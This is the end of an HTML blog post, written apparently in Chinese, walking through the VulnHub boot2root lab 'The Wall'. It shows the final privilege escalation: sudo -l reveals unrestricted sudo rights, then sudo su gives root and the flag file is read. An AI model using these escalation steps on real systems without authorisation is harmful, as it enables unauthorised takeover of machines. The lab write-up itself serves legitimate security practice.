+<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>, 1005<span class="o">(</span>welcometothemachine<span class="o">)</span></code></pre></div>
+
+
+<p>只是拿到daemon和www的權限之後有點無所適從，最後才發現其實是拿到了sudo的權限</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>sudo -l
+Password:
+Matching Defaults entries <span class="k">for</span> DavidGilmour on thewall:
+    env_keep+<span class="o">=</span><span class="s2">&quot;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&quot;</span>
+
+User DavidGilmour may run the following commands on thewall:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
+
+<span class="nv">$ </span>sudo su
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>, 2<span class="o">(</span>kmem<span class="o">)</span>, 3<span class="o">(</span>sys<span class="o">)</span>, 4<span class="o">(</span>tty<span class="o">)</span>, 5<span class="o">(</span>operator<span class="o">)</span>, 20<span class="o">(</span>staff<span class="o">)</span>, 31<span class="o">(</span>guest<span class="o">)</span>
+<span class="c"># cat /root/flag.txt</span>
+
+<span class="s2">&quot;The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar&quot;</span>
+
+                   Congratulations on rooting thewall!
+
+   ___________________________________________________________________
+  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
+  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>______ <span class="s1">&#39;__  ___|_______|_______|_______|_______|_|</span>
+<span class="s1">  |     |       |       |   |  )      /         |       |       |     |</span>
+<span class="s1">  |_____|_______|_______|__ |,&#39;</span> , .  <span class="p">|</span> <span class="p">|</span> _ , ___<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
+  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>      ,<span class="p">|</span>   <span class="p">|</span> <span class="p">|</span><span class="se">\ </span><span class="p">|</span> <span class="p">|</span> ,<span class="s1">&#39; |       |       |       | |</span>
+<span class="s1">  |_|_______|_______|____ &#39;</span> <span class="p">|</span> _ <span class="p">|</span> <span class="p">|</span> <span class="se">\|</span> <span class="p">|</span><span class="s1">&#39;\ _|_______|_______|_______|_|</span>
+<span class="s1">  |     |       |       |   \  _&#39;</span> <span class="s1">&#39;  ` |  \     |       |       |     |</span>
+<span class="s1">  |_____|_______|_______|_  ,-&#39;</span>_ _____ <span class="p">|</span> _______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
+  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   ,-<span class="s1">&#39;|  _     |       |       |       |       | |</span>
+<span class="s1">  |_|_______|_______|__  ,-|-&#39;</span> <span class="p">|</span>  ,-. <span class="se">\ </span>/_.--. _____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
+  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>          <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>  V  <span class="p">|</span>   <span class="o">)</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
+  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_ <span class="p">|</span> _ <span class="p">|</span>-<span class="s1">&#39;`-&#39;</span>  <span class="p">|</span>  <span class="p">|</span> ,<span class="s1">&#39; _|_______|_______|_____|</span>
+<span class="s1">  | |       |       |      |        |  &#39;</span>  <span class="p">;</span><span class="s1">&#39;        |       |       | |</span>
+<span class="s1">  |_|_______|_______|______&quot;|_____  _,- o&#39;</span>__<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
+  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       _,-<span class="s1">&#39;    .       |       |       |     |</span>
+<span class="s1">  |_____|_______|_______|_ _,--&#39;</span><span class="se">\ </span>     _,-<span class="s1">&#39;_____|_______|_______|_____|</span>
+<span class="s1">  | |       |       |     &#39;</span>     <span class="o">||</span>_<span class="o">||</span>-<span class="s1">&#39; _   |       |       |       | |</span>
+<span class="s1">  |_|_______|_______|_______|__ || ||,-&#39;</span>  __<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
+  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>  <span class="o">||</span>_,-<span class="s1">&#39;       |       |       |     |</span>
+<span class="s1">  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|</span>
+<span class="s1">  | |       |       |   \    |     /        |       |       |       | |</span>
+<span class="s1">  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|</span>
+<span class="s1">  |     |       |       | \      // \   |   |   |       |       |     |</span>
+<span class="s1">  |_____|_______|_______|_ \ /\ //--&#39;</span><span class="se">\ </span> <span class="p">|</span>   <span class="p">|</span> __<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
+  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="s1">&#39;  V/    |  |-&#39;</span> <span class="p">|</span>__,    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
+  <span class="p">|</span>_<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______ _______<span class="err">&#39;</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
+  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
+  <span class="p">|</span>_____<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_____<span class="p">|</span>
+  <span class="p">|</span>_________<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_______<span class="p">|</span>_<span class="p">|</span>
+
+                  Celebrating <span class="m">50</span> years of Pink Floyd!
+             Syd Barrett <span class="o">(</span>RIP<span class="o">)</span>, Nick Mason, Roger Waters,
+               Richard Wright <span class="o">(</span>RIP<span class="o">)</span>, and David Gilmour.
+
+
+** Shoutouts **
++ @vulnhub <span class="k">for</span> making it all possible
++ @rastamouse @thecolonial - <span class="s2">&quot;the test bunnies&quot;</span>
+
+-<span class="o">=========================================</span>-
+-  xerubus <span class="o">(</span>@xerubus - www.mogozobo.com<span class="o">)</span>  -
+-<span class="o">=========================================</span>-
+<span class="c">#</span></code></pre></div>
+
+
+<p>花了6個小時終於拿到flag了T<sup>T</sup></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-12-19T17:57:45+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>19</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:57 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/12/19/the_wall_1/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/12/19/the_wall_1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/12/19/sicoks1.1/" title="Previous Post: SickOS 1.1">&laquo; SickOS 1.1</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/12/20/sleepy/" title="Next Post: /dev/random: Sleepy">/dev/random: Sleepy &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
